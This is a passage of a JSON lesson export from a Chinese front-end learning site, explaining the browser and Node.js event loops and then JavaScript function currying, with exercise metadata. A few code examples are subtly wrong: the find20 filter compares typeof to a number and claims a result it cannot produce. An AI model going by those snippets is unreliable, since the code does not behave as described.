   // promise1\n```\n\n🔨 结果分析：\n\n![案例分析1.png](https://static.ecool.fun//article/91b9ef7e-023c-48de-a485-1ec5c8a80300.jpeg)\n\n1.  执行全局代码，到达 `setTimeout` 交给计时器线程处理，由于等待 0 ms 故立刻加入延迟队列。\n2.  到达 `btn.click()`，由于是人工合成的点击事件，直接当同步任务执行，输出 `click button`。\n3.  到达 `Promise.resolve().then()`，交给其他线程处理，立即完成并加入微队列。\n4.  输出 `script start`，至此同步任务完成，各消息队列的情况为：微队列有 1 个排队任务，延迟队列有 1 个排位任务。\n5.  事件循环开始，根据队列优先级，首先渲染主线程拿取并清空微队列任务，输出 `promise2`。\n6.  渲染主线程拿取并清空延迟队列任务，输出 `set timer`，遇到第二个 `Promise.resolve().then()`，交给其他线程处理，完成后加入微队列。\n7.  渲染主线程无任务可做，进入休眠。\n8.  其他线程会立刻完成对第二个 `Promise.resolve().then()` 的处理，并将回调函数 `test` 加入微队列。\n9.  微队列出现任务，渲染主线程被唤醒，拿取并清空微队列任务。\n10.  执行 `test` 函数，输出 `function test!`，遇到第三个 `Promise.resolve().then()`，交给其他线程处理，完成后加入微队列。\n11.  渲染主线程无任务可做，进入休眠。\n12.  其他线程会立刻完成对第三个 `Promise.resolve().then()` 的处理，并将回调函数操作 `console.log` 加入微队列。\n13.  微队列出现任务，渲染主线程被唤醒，拿取并清空微队列任务。\n14.  执行 `console.log` 操作，输出 `promise1`。\n\n## Node.js 事件循环\n\n### Libuv\n\n在 JavaScript 的所有宿主环境中，无论是浏览器还是 Node.js，事件循环机制都不是 **ECMAScript** 的语言规范定义的。浏览器中的事件循环是根据 **HTML 标准**实现的，而 Node.js 中的事件循环则是基于 `libuv` 实现的。\n\n`libuv` 是一个用 C 语言实现的高性能解决单线程非阻塞异步 I/O 的开源库，本质上它是对常见**操作系统底层异步 I/O 操作**的封装。在 nodejs 底层，Node API 的实现其实就是调用的它。\n\n我们知道浏览器事件循环中执行异步任务的其他线程是由浏览器本身提供的，多线程调度是由渲染主线程完成的。而在 nodejs 中，这都是 `libuv` 完成的。\n\n几乎每个 Node API 都有**异步执行版本**，`libuv` 直接负责它们的执行，`libuv` 会开启一个线程池，主线程执行到异步操作后，`libuv` 就会在**线程池**中调度空闲线程去执行，可以说 `libuv` 为 nodejs 提供了整个事件循环功能。\n\n![libuv.webp](https://static.ecool.fun//article/8ac6376c-0163-4930-8bb5-a1e3dfa8205b.jpeg)\n\n### Node.js 中的 Event Loop\n\n与在浏览器中一样，在 nodejs 中 JS 最开始在**主线程**上执行，执行同步任务、发出异步请求、规划定时器生效时间、执行 process.nextTick 等，这时事件循环还没开始。\n\n在上述过程中，如果没有异步操作，代码在执行完成后便**直接退出**。如果有，`libuv` 会把不同的异步任务分配给**不同的线程**，形成事件循环。在同步代码执行完后，nodejs 便会进入事件循环，依次执行不同队列中的任务。`libuv` 会以异步的方式将任务的执行结果返回给 **V8 引擎**，V8 引擎再返回给用户。\n\n![nodejs 事件循环.png](https://static.ecool.fun//article/b9aba154-2fa9-4ce7-8df7-ebb371b47ac1.jpeg)\n\nNodejs 事件循环中的消息队列共有 **8** 个，若引用之前宏队列、微队列的说法，具体可划分为：\n\n-   宏队列\n    -   timers (重要)\n    -   pending callback\n        -   调用上一次事件循环没在 `poll` 阶段立刻执行，而延迟的 I/O 回调函数\n    -   idle prepare\n        -   仅供 nodejs 内部使用\n    -   poll (重要)\n    -   check (重要)\n    -   close callbacks\n        -   执行所有注册 `close` 事件的回调函数\n-   微队列\n    -   nextTick\n    -   Promise\n\n我们先来说说宏队列中比较重要的 3 个：\n\n📚 timers\n\n`timers`，也就是**计时器队列**，负责处理 `setTimeout` 和 `setInterval` 定义的回调函数。\n\n值得注意的是，不管在浏览器中还是 nodejs 中，所有的定时器回调函数都**不能保证**到达时间后立即执行。一是因为从计算机硬件和底层操作系统来看，计时器的实现本身就是不精准的，二是因为 `poll` 阶段对 `timers` 阶段的深刻影响。因为在没有满足 `poll` 阶段的结束条件前，就无法进入下一次事件循环的 `timers` 阶段，即使 `timers` 队列中已经有计时器到期的回调函数。\n\n📚 poll\n\n`poll` 称为**轮询队列**，该阶段会处理除 `timers` 和 `check` 队列外的绝大多数 I/O 回调任务，如文件读取、监听用户请求等。\n\n事件循环到达该阶段时，它的运行方式为：\n\n-   如果 `poll` 队列中有回调任务，则依次执行回调直到清空队列。\n-   如果 `poll` 队列中没有回调任务\n    -   若其他队列中后续可能会出现回调任务，则一直等待，等其他队列中后续的回调任务来临时，结束该阶段，开启下一次事件循环\n    -   若等待时间超过预设的时间限制，也会自动进入下一次事件循环\n    -   若其他队列中后续不可能再出现回调任务了，则立即结束该阶段，并在本轮事件循环完成后，退出 node 程序\n\n> `poll` 阶段的超时时间在进入 `poll` 阶段之前计算。\n\n💎 案例 1：不精准的计时器\n\n```js\n    const fs = require('fs');\n    const start = Date.now(); \n    \n    setTimeout(() => { \n        console.log('setTimeout exec', Date.now() - start); \n    }, 200)\n    \n    fs.readFile('./index.js', 'utf-8', (err, data) => {\n        console.log('file read');\n        const start = Date.now();\n        while(Date.now() - start < 300) {};\n    })\n    \n    // 输出结果：\n    // file read\n    // setTimeout exec 313ms\n```\n\n🔨 分析 1：\n\n1.  进入事件循环后，定时器还没到时间，`timers` 队列空，来到 `poll` 阶段\n2.  读取文件需要一定时间，`poll` 队列空，等待\n3.  文件读取完成，回调函数加入 `poll` 队列，执行输出 `file read`，开启循环，阻塞 300ms\n4.  定时器到时间，回调函数加入 `timers` 队列，由于 `poll` 阶段未结束，被阻塞，等待\n5.  `poll` 中的循环结束，检测到 `timers` 中有任务，结束 `poll` 阶段，开始下一次事件循环\n6.  执行 `timers` 中的回调函数，输出 `setTimeout exec 313ms`，计时器回调函数并没有在计时器到达时立即执行\n\n📚 check\n\n`check` 称为**检查队列**，负责处理 `setImmediate` 定义的回调函数。\n\n`setTimeout` 和 `setImmediate` 的不同之处在于，每次执行到 `timers` 队列时，定时器观察者内部会去**检查**代码中的定时器是否超过定时时间，而 `setImmediate` 则是**直接**将回调任务**加入**到 `check` 队列。\n\n所以总的来说，`setImmediate` 的执行效率要远高于 `setTimeout`，于是也就出现了下面**无法预测**输出结果的情况：\n\n```js\n    setTimeout(() => {\n        console.log('setTimeout');\n    }, 0)\n    \n    setImmediate(() => {\n        console.log('setImmediate');\n    })\n    \n    // 上述代码是无法预测先输出那个的\n    // 因为即使 setTimeout(xxx, 0)，在计算机运算慢的情况下也不能立刻加入 timers 队列\n```\n\n  \n\n对于微队列的 `nextTick` 和 `Promise`，严格意义上讲也不属于事件循环。在事件循环中，每次打算进入下个阶段之前，必须要先依次反复清空 `nextTick` 和 `promise` 队列，直到两个队列完全没有即将要到来的任务的时候再进入下个阶段。\n\n我们可以通过 `process.nextTick()` 将回调函数加入 `nextTick` 队列，和通过 `Promise.resolve().then()` 将回调函数加入 `Promise` 队列，且 `nextTick` 队列的优先级还要**高于** `Promise` 队列，所以 `process.nextTick` 是 nodejs 中执行**最快**的异步操作。\n\n💎 案例 2\n\n```js\n    async function async1() {\n      console.log(\"async1 start\");\n      await async2();\n      console.log(\"async1 end\");\n    }\n\n    async function async2() {\n      console.log(\"async2\");\n    }\n\n    console.log(\"script start\");\n\n    setTimeout(function () {\n      console.log(\"setTimeout0\");\n    }, 0);\n\n    setTimeout(function () {\n      console.log(\"setTimeout3\");\n    }, 3);\n\n    setImmediate(() => console.log(\"setImmediate\"));\n\n    process.nextTick(() => console.log(\"nextTick\"));\n\n    async1();\n\n    new Promise(function (resolve) {\n      console.log(\"promise1\");\n      resolve();\n      console.log(\"promise2\");\n    }).then(function () {\n      console.log(\"promise3\");\n    });\n\n    console.log(\"script end\");\n    \n    // 输出结果依次为：\n    // script start\n    // async1 start\n    // async2\n    // promise1\n    // promise2\n    // script end\n    // nextTick\n    // async1 end\n    // promise3\n    // 剩下的 setTimeout0、setTimeout3、setImmediate 顺序不定\n    // 唯一能确定的是 setTimeout0 在 setTimeout3 前输出\n    // 而 setImmediate 可能在 setTimeout0 前也可能在 setTimeout3 之后，也可能在两者中间\n```\n\n🔨 分析 2：\n\n1.  执行全局代码，输出 `script start`。\n2.  到达 `setTimeout(0)` 和 `setTimeout(3)`，交给计时器线程开始计时，注意在线程计时完成前，两个回调任务 `console.log` 还未加入 `timers` 队列。\n3.  到达 `setImmediate`，立刻将 `console.log` 任务加入 `check` 队列。\n4.  到达 `process.nextTick`，立刻将 `console.log` 任务加入 `nextTick` 队列。\n5.  执行 `async1`，输出 `async1 start`。`await async2()` 立刻执行 `async2()`，输出 `async2` 将后续 `console.log` 任务包装成 `Promise.then()` 加入 `Promise` 队列。\n6.  执行 `new Promise()`，输出 `promise1`、`promise2`，这两步是同步代码。然后将 `.then()` 里的 `console.log` 任务扔进 `Promise` 队列。\n7.  执行最后的 `console.log`，输出 `script end`。\n8.  至此同步代码全部执行完毕，消息队列中仍有任务，进入事件循环。\n\n> 梳理一下此时各消息队列的状态：\n> \n> 已有的输出：`script start`、`async1 start`、`async2`、`promise1`、`promise2`、`script end`  \n> `nextTick` 队列：`console.log(\"nextTick\")`  \n> `Promise` 队列：`console.log(\"async1 end\")`、`console.log(\"promise3\")`  \n> `timers` 队列：`console.log(\"setTimeout0\")`、`console.log(\"setTimeout3\")`  \n> `check` 队列：`console.log(\"setImmediate\")`\n\n9.  在进入 `timers` 阶段前先清空微队列，先执行 `nextTick` 队列，输出 `nextTick`。\n10.  执行 `Promise` 队列，依次输出 `async1 end`、`promise3`。\n11.  进入 `timers` 阶段，由于不确定在到达这个阶段前，计时器线程有没有把完成对 `setTimeout(0)` 和 `setTimeout(3)` 中的一者或两者的时间检查，并将回调函数推入 `timers` 队列，故无法预测它们与 `check` 队列中的 `setImmediate` 谁先输出。",
    "testPoint": "### 1. **事件循环的基本概念**\n   - **定义**：事件循环是一种运行时机制，它允许 JavaScript 在单线程环境中处理异步任务。它通过不断检查任务队列来确保代码的顺序执行。\n\n### 2. **执行栈（Call Stack）**\n   - **定义**：执行栈是一个后进先出（LIFO）的数据结构，用于存储当前正在执行的函数。每当一个函数被调用时，它会被压入栈中；当函数执行完毕后，它会被弹出栈。\n   - **示例**：\n     ```javascript\n     function first() {\n         console.log('First');\n     }\n\n     function second() {\n         console.log('Second');\n     }\n\n     first(); // 执行\n     second(); // 执行\n     ```\n\n### 3. **任务队列（Task Queue）**\n   - **定义**：任务队列是存放待执行任务的地方，包括异步操作（如回调函数、事件处理程序等）。当执行栈为空时，事件循环会从任务队列中取出任务并执行。\n   - **示例**：\n     ```javascript\n     setTimeout(() => {\n         console.log('Timeout callback');\n     }, 0);\n     console.log('Synchronous code');\n     ```\n\n### 4. **微任务队列（Microtask Queue）**\n   - **定义**：微任务队列存放优先级高的任务，如 Promise 的 `.then()` 回调和 `MutationObserver`。微任务会在当前执行栈为空后立即执行，而不是等到下一个事件循环。\n   - **示例**：\n     ```javascript\n     Promise.resolve().then(() => {\n         console.log('Promise resolved');\n     });\n     console.log('Synchronous code');\n     ```\n\n### 5. **事件循环的执行顺序**\n   - **顺序执行**：事件循环的基本执行顺序为：\n     1. 执行栈中的所有同步代码。\n     2. 执行微任务队列中的所有任务（直到队列为空）。\n     3. 从任务队列中取出一个任务执行。\n     4. 重复步骤 2 和 3，直到没有任务。\n\n### 6. **异步操作的处理**\n   - **异步任务的入队**：当异步操作（如网络请求、定时器等）完成时，其回调函数会被添加到任务队列或微任务队列中，等待执行。\n   - **示例**：\n     ```javascript\n     console.log('Start');\n     setTimeout(() => {\n         console.log('Timeout');\n     }, 0);\n     Promise.resolve().then(() => {\n         console.log('Promise');\n     });\n     console.log('End');\n     ```\n\n### 7. **宏任务与微任务**\n   - **宏任务**：包含 `setTimeout`、`setInterval` 和 I/O 操作等。\n   - **微任务**：包括 Promise 的回调、`process.nextTick()` 等。微任务的优先级高于宏任务。\n\n### 8. **实践中的应用**\n   - **UI 更新**：了解事件循环如何影响 UI 更新和用户交互，确保良好的用户体验。\n   - **性能优化**：避免阻塞事件循环，减少长时间运行的同步代码。\n\n### 9. **性能陷阱**\n   - **长时间运行的任务**：长时间执行的同步任务会阻塞事件循环，导致界面无响应。\n   - **避免回调地狱**：使用 Promise 或 async/await 来管理异步操作，避免过深的回调嵌套。\n\n### 10. **调试技巧**\n   - **使用 Chrome DevTools**：了解如何使用浏览器的开发者工具来监控事件循环、异步操作和性能瓶颈。",
    "exerciseKeyList": "[\"12240b0e-e285-422e-b6ac-b1e839af6cae\",\"2b415f44-7a22-4e74-bef4-1b7c09e170d4\",\"b1b488cb-0f79-4d12-bdab-4c070e0da072\",\"d6b01c3c-e671-4edf-a739-35745ff5119e\",\"d74aa7b7-f554-4ee8-9adb-2599e1caf57c\"]",
    "vipLimit": 0,
    "level": 3,
    "pointOrder": 13,
    "createAt": "2024-10-01T12:38:12.000Z",
    "updateAt": "2024-11-08T14:40:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "12240b0e-e285-422e-b6ac-b1e839af6cae",
        "title": "浏览器和 Node 中的事件循环有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-07T09:43:34.000Z",
        "updateAt": "2025-07-16T11:51:05.000Z"
      },
      {
        "exerciseKey": "2b415f44-7a22-4e74-bef4-1b7c09e170d4",
        "title": "说说对Nodejs中的事件循环机制理解?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-25T02:19:20.000Z",
        "updateAt": "2024-08-10T17:05:31.000Z"
      },
      {
        "exerciseKey": "b1b488cb-0f79-4d12-bdab-4c070e0da072",
        "title": "说说你对事件循环的理解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:56:45.000Z",
        "updateAt": "2024-08-10T17:04:34.000Z"
      },
      {
        "exerciseKey": "d6b01c3c-e671-4edf-a739-35745ff5119e",
        "title": "为什么要区分宏任务和微任务？它们的执行优先级是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-31T01:17:16.000Z",
        "updateAt": "2024-07-19T10:43:00.000Z"
      },
      {
        "exerciseKey": "d74aa7b7-f554-4ee8-9adb-2599e1caf57c",
        "title": "process.nextTick, setTimeout 以及 setImmediate 三者的执行顺序？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2024-08-14T14:17:17.000Z"
      }
    ]
  },
  "19": {
    "id": 19,
    "tagId": 10,
    "title": "函数柯里化",
    "explanation": "柯里化是函数的一个比较高级的应用，想要理解它并不简单。\n\n通过《函数与函数式编程》的学习，我们知道，接收函数作为参数的函数，都可以叫做高阶函数。我们常常利用高阶函数来封装一些公共的逻辑。\n\n\n我们接下来要学习的柯里化，其实就是高阶函数的一种特殊用法。\n\n\n\n**柯里化是指这样一个函数(假设叫做createCurry)，他接收函数A作为参数，运行后能够返回一个新的函数。并且这个新的函数能够处理函数A的剩余参数。**\n\n\n\n这样的定义可能不太好理解，我们可以通过下面的例子配合理解。\n\n\n\n假如有一个接收三个参数的函数A。\n\n\n\n```javascript\nfunction A(a, b, c) {\n    // do something\n}\n```\n\n\n\n又假如我们有一个已经封装好了的柯里化通用函数createCurry。他接收bar作为参数，能够将A转化为柯里化函数，返回结果就是这个被转化之后的函数。\n\n\n\n```javascript\nvar _A = createCurry(A);\n```\n\n\n\n那么_A作为createCurry运行的返回函数，他能够处理A的剩余参数。因此下面的运行结果都是等价的。\n\n\n\n```javascript\n_A(1, 2, 3);\n_A(1, 2)(3);\n_A(1)(2, 3);\n_A(1)(2)(3);\nA(1, 2, 3);\n```\n\n\n\n函数A被createCurry转化之后得到柯里化函数_A，_A能够处理A的所有剩余参数。因此柯里化也被称为部分求值。\n\n\n\n在简单的场景下，我们可以不用借助柯里化通用式来转化得到柯里化函数，我们可以凭借眼力自己封装。\n\n\n\n例如有一个简单的加法函数，他能够将自身的三个参数加起来并返回计算结果。\n\n\n\n```javascript\nfunction add(a, b, c) {\n    return a + b + c;\n}\n```\n\n\n\n那么add函数的柯里化函数_add则可以如下：\n\n\n\n```javascript\nfunction _add(a) {\n    return function(b) {\n        return function(c) {\n            return a + b + c;\n        }\n    }\n}\n```\n\n\n\n因此下面的运算方式是等价的。\n\n\n\n```javascript\nadd(1, 2, 3);\n_add(1)(2)(3);\n```\n\n\n\n当然，柯里化通用式具备更加强大的能力，我们靠眼力自己封装的柯里化函数则自由度偏低。因此我们仍然需要知道自己如何去封装这样一个柯里化的通用式。\n\n\n\n首先通过_add可以看出，柯里化函数的运行过程其实是一个参数的收集过程，我们将每一次传入的参数收集起来，并在最里层里面处理。因此我们在实现createCurry时，可以借助这个思路来进行封装。\n\n\n\n封装如下:\n\n\n\n```javascript\n// 简单实现，参数只能从右到左传递\nfunction createCurry(func, args) {\n\n    var arity = func.length;\n    var args = args || [];\n\n    return function() {\n        var _args = [].slice.call(arguments);\n        [].push.apply(_args, args);\n\n        // 如果参数个数小于最初的func.length，则递归调用，继续收集参数\n        if (_args.length < arity) {\n            return createCurry.call(this, func, _args);\n        }\n\n        // 参数收集完毕，则执行func\n        return func.apply(this, _args);\n    }\n}\n```\n\n\n\n尽管我已经做了足够详细的注解，但是我想理解起来也并不是那么容易，因此建议大家用点耐心多阅读几遍。这个createCurry函数的封装借助闭包与递归，实现了一个参数收集，并在收集完毕之后执行所有参数的一个过程。\n\n\n\n因此聪明的读者可能已经发现，把函数经过createCurry转化为一个柯里化函数，最后执行的结果，不是正好相当于执行函数自身吗？柯里化是不是把简单的问题复杂化了？\n\n\n\n如果你能够提出这样的问题，那么说明你确实已经对柯里化有了一定的了解。柯里化确实是把简答的问题复杂化了，但是复杂化的同时，我们在使用函数时拥有了更加多的自由度。而这里对于函数参数的自由处理，正是柯里化的核心所在。\n\n\n\n我们来举一个非常常见的例子。\n\n\n\n如果我们想要验证一串数字是否是正确的手机号，那么按照普通的思路来做，大家可能是这样封装，如下：\n\n\n\n```javascript\nfunction checkPhone(phoneNumber) {\n    return /^1[34578]\\d{9}$/.test(phoneNumber);\n}\n```\n\n\n\n而如果我们想要验证是否是邮箱呢？这么封装：\n\n\n\n```javascript\nfunction checkEmail(email) {\n    return /^(\\w)+(\\.\\w+)*@(\\w)+((\\.\\w+)+)$/.test(email);\n}\n```\n\n\n\n我们还可能会遇到验证身份证号，验证密码等各种验证信息，因此在实践中，为了统一逻辑，，我们就会封装一个更为通用的函数，将用于验证的正则与将要被验证的字符串作为参数传入。\n\n\n\n```javascript\nfunction check(targetString, reg) {\n    return reg.test(targetString);\n}\n```\n\n\n\n但是这样封装之后，在使用时又会稍微麻烦一点，因为会总是输入一串正则，这样就导致了使用时的效率低下。\n\n\n\n```javascript\ncheck(/^1[34578]\\d{9}$/, '14900000088');\ncheck(/^(\\w)+(\\.\\w+)*@(\\w)+((\\.\\w+)+)$/, 'test@163.com');\n```\n\n\n\n那么这个时候，我们就可以借助柯里化，在check的基础上再做一层封装，以简化使用。\n\n\n\n```javascript\nvar _check = createCurry(check);\n\nvar checkPhone = _check(/^1[34578]\\d{9}$/);\nvar checkEmail = _check(/^(\\w)+(\\.\\w+)*@(\\w)+((\\.\\w+)+)$/);\n```\n\n\n\n最后在使用的时候就会变得更加直观与简洁了。\n\n\n\n```javascript\ncheckPhone('183888888');\ncheckEmail('xxxxx@test.com');\n```\n\n\n\n经过这个过程我们发现，柯里化能够应对更加复杂的逻辑封装。当情况变得多变，柯里化依然能够应付自如。\n\n\n\n虽然柯里化确实在一定程度上将问题复杂化了，也让代码更加不容易理解，但是柯里化在面对复杂情况下的灵活性却让我们不得不爱。\n\n\n\n当然这个案例本身情况还算简单，所以还不能够特别明显的凸显柯里化的优势，我们的主要目的在于借助这个案例帮助大家了解柯里化在实践中的用途。\n\n\n\n我们继续来思考一个例子。这个例子与map有关。在高阶函数的章节中，我们分析了封装map方法的思考过程。由于我们没有办法确认一个数组在遍历时会执行什么操作，因此我们只能将调用for循环的这个统一逻辑封装起来，而具体的操作则通过参数传入的形式让使用者自定义。这就是map函数。\n\n\n\n但是，这是针对了所有的情况我们才会这样想。\n\n\n\n实践中我们常常会发现，在我们的某个项目中，针对于某一个数组的操作其实是固定的，也就是说，同样的操作，可能会在项目的不同地方调用很多次。\n\n\n\n于是，这个时候，我们就可以在map函数的基础上，进行二次封装，以简化我们在项目中的使用。假如这个在我们项目中会调用多次的操作是将数组的每一项都转化为百分比 1 --> 100%。\n\n\n\n普通思维下我们可以这样来封装。\n\n\n\n```javascript\nfunction getNewArray(array) {\n    return array.map(function(item) {\n        return item * 100 + '%'\n    })\n}\n\ngetNewArray([1, 2, 3, 0.12]);   // ['100%', '200%', '300%', '12%'];\n```\n\n\n\n而如果借助柯里化来二次封装这样的逻辑，则会如下实现：\n\n\n\n```javascript\nfunction _map(func, array) {\n    return array.map(func);\n}\n\nvar _getNewArray = createCurry(_map);\n\nvar getNewArray = _getNewArray(function(item) {\n    return item * 100 + '%'\n})\n\ngetNewArray([1, 2, 3, 0.12]);   // ['100%', '200%', '300%', '12%'];\ngetNewArray([0.01, 1]); // ['1%', '100%']\n```\n\n\n\n如果我们的项目中的固定操作是希望对数组进行一个过滤，找出数组中的所有Number类型的数据。借助柯里化思维我们可以这样做。\n\n\n\n```javascript\nfunction _filter(func, array) {\n    return array.filter(func);\n}\n\nvar _find = createCurry(_filter);\n\nvar findNumber = _find(function(item) {\n    if (typeof item == 'number') {\n        return item;\n    }\n})\n\nfindNumber([1, 2, 3, '2', '3', 4]); // [1, 2, 3, 4]\n\n// 当我们继续封装另外的过滤操作时就会变得非常简单\n// 找出数字为20的子项\nvar find20 = _find(function(item, i) {\n    if (typeof item === 20) {\n        return i;\n    }\n})\nfind20([1, 2, 3, 30, 20, 100]);  // 4\n\n// 找出数组中大于100的所有数据\nvar findGreater100 = _find(function(item) {\n    if (item > 100) {\n        return item;\n    }\n})\nfindGreater100([1, 2, 101, 300, 2, 122]); // [101, 300, 122]\n```\n\n\n\n我采用了与check例子不一样的思维方向来想大家展示我们在使用柯里化时的想法。目的是想告诉大家，柯里化能够帮助我们应对更多更复杂的场景。\n\n\n\n当然不得不承认，这些例子都太简单了，简单到如果使用柯里化的思维来处理他们显得有一点多此一举，而且变得难以理解。因此我想读者朋友们也很难从这些例子中感受到柯里化的魅力。不过没关系，如果我们能够通过这些例子掌握到柯里化的思维，那就是最好的结果了。在未来你的实践中，如果你发现用普通的思维封装一些逻辑慢慢变得困难，不妨想一想在这里学到的柯里化思维，应用起来，柯里化足够强大的自由度一定能给你一个惊喜。\n\n\n\n当然也并不建议在任何情况下以炫技为目的的去使用柯里化，在柯里化的实现中，我们知道柯里化虽然具有了更多的自由度，但同时柯里化通用式里调用了arguments对象，使用了递归与闭包，因此柯里化的自由度是以牺牲了一定的性能为代价换来的。只有在情况变得复杂时，才是柯里化大显身手的时候。\n\n\n\n##### 额外知识补充\n\n\n无限参数的柯里化。\n\n\n\n> 该部分内容可忽略\n>\n\n\n\n在前端面试中，你可能会遇到这样一个涉及到柯里化的题目。\n\n\n\n```javascript\n// 实现一个add方法，使计算结果能够满足如下预期：\nadd(1)(2)(3) = 6;\nadd(1, 2, 3)(4) = 10;\nadd(1)(2)(3)(4)(5) = 15;\n```\n\n\n\n这个题目的目的是想让add执行之后返回一个函数能够继续执行，最终运算的结果是所有出现过的参数之和。而这个题目的难点则在于参数的不固定。我们不知道函数会执行几次。因此我们不能使用上面我们封装的createCurry的通用公式来转换一个柯里化函数。只能自己封装，那么怎么办呢？在此之前，补充2个非常重要的知识点。\n\n\n\n一个是ES6函数的不定参数。假如我们有一个数组，希望把这个数组中所有的子项展开传递给一个函数作为参数。那么我们应该怎么做？\n\n\n\n```javascript\n// 大家可以思考一下，如果将args数组的子项展开作为add的参数传入\nfunction add(a, b, c, d) {\n    return a + b + c + d;\n}\nvar args = [1, 3, 100, 1];\n```\n\n\n\n在ES5中，我们可以借助之前学过的apply来达到我们的目的。\n\n\n\n```javascript\nadd.apply(null, args);  // 105\n```\n\n\n\n而在ES6中，提供了一种新的语法来解决这个问题，那就是不定参。写法如下：\n\n\n\n```javascript\nadd(...args);  // 105\n```\n\n\n\n这两种写法是等效的。OK，先记在这里。在接下的实现中，我们会用到不定参数的特性。\n\n\n\n第二个要补充的知识点是函数的隐式转换。当我们直接将函数参与其他的计算时，函数会默认调用toString方法，直接将函数体转换为字符串参与计算。\n\n\n\n```javascript\nfunction fn() { return 20 }\nconsole.log(fn + 10);     // 输出结果 function fn() { return 20 }10\n```\n\n\n\n但是我们可以重写函数的toString方法，让函数参与计算时，输出我们想要的结果。\n\n\n\n```javascript\nfunction fn() { return 20; }\nfn.toString = function() { return 30 }\n\nconsole.log(fn + 10); // 40\n```\n\n\n\n除此之外，当我们重写函数的valueOf方法也能够改变函数的隐式转换结果。\n\n\n\n```javascript\nfunction fn() { return 20; }\nfn.valueOf = function() { return 60 }\n\nconsole.log(fn + 10); // 70\n```\n\n\n\n当我们同时重写函数的toString方法与valueOf方法时，最终的结果会取valueOf方法的返回结果。\n\n\n\n```javascript\nfunction fn() { return 20; }\nfn.valueOf = function() { return 50 }\nfn.toString = function() { return 30 }\n\nconsole.log(fn + 10); // 60\n```\n\n\n\n补充了这两个知识点之后，我们可以来尝试完成之前的题目了。add方法的实现仍然会是一个参数的收集过程。当add函数执行到最后时，仍然返回的是一个函数，但是我们可以通过定义toString/valueOf的方式，让这个函数可以直接参与计算，并且转换的结果是我们想要的。而且它本身也仍然可以继续执行接收新的参数。实现方式如下。\n\n\n\n```javascript\nfunction add() {\n    // 第一次执行时，定义一个数组专门用来存储所有的参数\n    var _args = [].slice.call(arguments);\n\n    // 在内部声明一个函数，利用闭包的特性保存_args并收集所有的参数值\n    var adder = function () {\n        var _adder = function() {\n            // [].push.apply(_args, [].slice.call(arguments));\n            _args.push(...arguments);\n            return _adder;\n        };\n\n        // 利用隐式转换的特性，当最后执行时隐式转换，并计算最终的值返回\n        _adder.toString = function () {\n            return _args.reduce(function (a, b) {\n                return a + b;\n            });\n        }\n\n        return _adder;\n    }\n    // return adder.apply(null, _args);\n    return adder(..._args);\n}\n\nvar a = add(1)(2)(3)(4);   // f 10\nvar b = add(1, 2, 3, 4);   // f 10\nvar c = add(1, 2)(3, 4);   // f 10\nvar d = add(1, 2, 3)(4);   // f 10\n\n// 可以利用隐式转换的特性参与计算\nconsole.log(a + 10); // 20\nconsole.log(b + 20); // 30\nconsole.log(c + 30); // 40\nconsole.log(d + 40); // 50\n\n// 也可以继续传入参数，得到的结果再次利用隐式转换参与计算\nconsole.log(a(10) + 100);  // 120\nconsole.log(b(10) + 100);  // 120\nconsole.log(c(10) + 100);  // 120\nconsole.log(d(10) + 100);  // 120\n```\n\n\n\n```javascript\n// 其实上栗中的add方法，就是下面这个函数的柯里化函数，只不过我们并没有使用通用式来转化，而是自己封装\nfunction add(...args) {\n    return args.reduce((a, b) => a + b);\n}\n```\n\n\n\n> 以下为老版本讲解，请勿阅读学习，因为部分思维并不完全正确。\n>\n\n\n\n##### 一、补充知识点之函数的隐式转换\n\n\nJavaScript作为一种弱类型语言，它的隐式转换是非常灵活有趣的。当我们没有深入了解隐式转换的时候可能会对一些运算的结果会感动困惑，比如`4 + true = 5`。当然，如果对隐式转换了解足够深刻，肯定是能够很大程度上提高对js的使用能力。只是我没有打算将所有的隐式转换规则分享给大家，这里暂时只分享一下，函数在隐式转换中的一些规则。\n\n\n\n来一个简单的思考题。\n\n\n\n```plain\nfunction fn() {\n    return 20;\n}\n\nconsole.log(fn + 10); // 输出结果是多少？\n```\n\n\n\n稍微修改一下，再想想输出结果会是什么？\n\n\n\n```plain\nfunction fn() {\n    return 20;\n}\n\nfn.toString = function() {\n    return 10;\n}\n\nconsole.log(fn + 10);  // 输出结果是多少？\n```\n\n\n\n还可以继续修改一下。\n\n\n\n```plain\nfunction fn() {\n    return 20;\n}\n\nfn.toString = function() {\n    return 10;\n}\n\nfn.valueOf = function() {\n    return 5;\n}\n\nconsole.log(fn + 10); // 输出结果是多少？\n```\n\n\n\n```plain\n// 输出结果分别为\nfunction fn() {\n    return 20;\n}10\n\n20\n\n15\n```\n\n\n\n当使用console.log，或者进行运算时，隐式转换就可能会发生。从上面三个例子中我们可以得出一些关于函数隐式转换的结论。\n\n\n\n> 当我们没有重新定义toString与valueOf时，函数的隐式转换会调用默认的toString方法，它会将函数的定义内容作为字符串返回。而当我们主动定义了toString/vauleOf方法时，那么隐式转换的返回结果则由我们自己控制了。其中valueOf会比toString后执行\n>\n\n\n\n因此上面例子的结论就很容易理解了。建议大家动手尝试一下。\n\n\n\n##### 二、补充知识点之利用call/apply封数组的map方法\n\n\n> map(): 对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。\n>\n\n\n\n通俗来说，就是遍历数组的每一项元素，并且在map的第一个参数（回调函数）中进行运算处理后返回计算结果。返回一个由所有计算结果组成的新数组。\n\n\n\n```plain\n// 回调函数中有三个参数\n// 第一个参数表示newArr的每一项，第二个参数表示该项在数组中的索引值\n// 第三个表示数组本身\n// 除此之外，回调函数中的this，当map不存在第二参数时，this指向丢失，当存在第二个参数时，指向改参数所设定的对象\nvar newArr = [1, 2, 3, 4].map(function(item, i, arr) {\n    console.log(item, i, arr, this);  // 可运行试试看\n    return item + 1;  // 每一项加1\n}, { a: 1 })\n\nconsole.log(newArr); // [2, 3, 4, 